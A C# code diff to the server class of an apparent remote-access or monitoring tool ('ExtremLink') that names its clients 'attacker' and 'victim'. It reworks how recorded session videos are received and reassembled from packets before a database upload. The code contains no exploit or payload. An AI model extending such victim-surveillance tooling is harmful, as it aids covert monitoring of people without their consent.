@@ -83,6 +83,7 @@ namespace ExtremLink_Server_v2.Classes
             get { return this.tempSession; }
             set { this.tempSession = value;}
         }
+        private DateTime tempSessionRecordedTime;
 
         // Singleton behavior:
         private static Server serverInstance = null;
@@ -105,8 +106,8 @@ namespace ExtremLink_Server_v2.Classes
             this.serverIpAddress = this.FindIpAddress();
             this.attacker = new Client(this.serverIpAddress, TypeOfClient.attacker);
             this.victim = new Client(this.serverIpAddress, TypeOfClient.victim);
-            tempSessionMP4FileName = "tempSessionFile.mp4";
             Log.LogInstance.AddMessage("🖧 Server Started");
+            Log.LogInstance.AddMessage($"The server's ip: {this.serverIpAddress.ToString()}");
         }
 
 
@@ -236,9 +237,9 @@ namespace ExtremLink_Server_v2.Classes
             {
                 byte[] sessionByteArr = GetSession();
                 Log.LogInstance.AddMessage("A session was received!");
+                this.tempSession = new Session(this.tempSessionRecordedTime, this.attacker.User.UserName);
                 this.tempSession.VideoContent = sessionByteArr;
                 this.tempSession.UploadSessionToDatabase();
-                this.tempSession = null;
             }
         }
 
@@ -384,9 +385,7 @@ namespace ExtremLink_Server_v2.Classes
             // Casting the data dynamic object to JObject
             JObject jsonData = (JObject)message;
 
-            DateTime sessionRecordTime = DateTime.Parse(message.RecordedTime);
-            string sessionUsername = this.attacker.User.UserName;
-            this.tempSession = new Session(sessionRecordTime, sessionUsername);
+            this.tempSessionRecordedTime = DateTime.Parse(message.RecordedTime);
         }
 
 
@@ -480,34 +479,58 @@ namespace ExtremLink_Server_v2.Classes
 
 
         // Getting sessions function:
-        private byte[] FromMP4ToByteArr()
-        {
-            // Input: Nothing.
-            // Output: A byte array which represent the content of temp mp4 file and returns it's content in bytes.
-            try
-            {
-                return File.ReadAllBytes(this.tempSessionMP4FileName);
-            }
-            catch (Exception ex)
-            {
-                throw new Exception(ex.Message);
-            }
-        }
         public byte[] GetSession()
         {
             // Input: Nothing
             // Output: The function returns a byte array which represents an mp4 file.
-            using (FileStream fileStream = new FileStream(this.tempSessionMP4FileName, FileMode.Create, FileAccess.Write))
-            {
-                byte[] buffer = new byte[8192];
-                int bytesRead;
+            Dictionary<int, byte[]> receivedPackets = new Dictionary<int, byte[]>();
+            int streamId = -1;
+            int totalPackets = -1;
 
-                while ((bytesRead = this.attacker.SessionTcpSocket.Receive(buffer)) > 0)
+            // Receive packets
+            while (receivedPackets.Count < totalPackets || totalPackets == -1)
+            {
+                // Buffer size for each packet
+                byte[] buffer = new byte[1412]; // 1400 + 12 bytes for metadata
+
+                int bytesRead = this.attacker.SessionTcpSocket.Receive(buffer);
+
+                // MessageBox.Show("A udp pakcet was received by the server from the victim");
+                // Extract metadata
+                int receivedStreamId = BitConverter.ToInt32(buffer, 0);
+                int receivedTotalPackets = BitConverter.ToInt32(buffer, 4);
+                int packetIndex = BitConverter.ToInt32(buffer, 8);
+
+                // Ensure packets are part of the same stream
+                if (streamId == -1) streamId = receivedStreamId;
+                if (totalPackets == -1) totalPackets = receivedTotalPackets;
+                if (streamId != receivedStreamId) continue;
+
+                // Extract segment data
+                byte[] segmentData = new byte[bytesRead - 12];
+                Array.Copy(buffer, 12, segmentData, 0, bytesRead - 12);
+
+                // Store segment if not already received
+                if (!receivedPackets.ContainsKey(packetIndex))
                 {
-                    fileStream.Write(buffer, 0, bytesRead);
+                    receivedPackets[packetIndex] = segmentData;
                 }
             }
-            return this.FromMP4ToByteArr();
+            using (var ms = new MemoryStream())
+            {
+                for (int i = 0; i < totalPackets; i++)
+                {
+                    if (receivedPackets.TryGetValue(i, out var segment))
+                    {
+                        ms.Write(segment, 0, segment.Length);
+                    }
+                    else
+                    {
+                        throw new Exception($"Missing packet {i}");
+                    }
+                }
+                return ms.ToArray();
+            }
         }
 
 
